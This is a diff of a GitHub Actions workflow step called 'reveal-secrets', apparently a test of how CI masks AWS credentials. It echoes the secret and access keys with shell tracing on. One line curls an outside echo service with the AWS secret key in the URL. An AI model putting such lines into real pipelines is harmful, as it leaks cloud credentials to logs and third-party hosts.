@@ -30,9 +30,10 @@ jobs:
       id: reveal-secrets
       env:
         AWS_SECRET_ACCESS_KEY: ${{ steps.import-secrets.outputs.AWS_SECRET_ACCESS_KEY}}
+        AWS_ACCESS_KEY: ${{ steps.import-secrets.outputs.AWS_ACCESS_KEY }} 
       run: |
         set -x
-        /usr/local/bin/echovalues.sh ${{ env.AWS_SECRET_ACCESS_KEY }} ${{ steps.import-secrets.outputs.AWS_ACCESS_KEY }}  first
+        /usr/local/bin/echovalues.sh $AWS_SECRET_ACCESS_KEY $AWS_ACCESS_KEY first
         /usr/local/bin/echovalues.sh "${{ env.AWS_SECRET_ACCESS_KEY }}" '${{ steps.import-secrets.outputs.AWS_ACCESS_KEY }}'  second
         curl https://echo.free.beeceptor.com/sample-request?secret=${{ env.AWS_SECRET_ACCESS_KEY }}
 
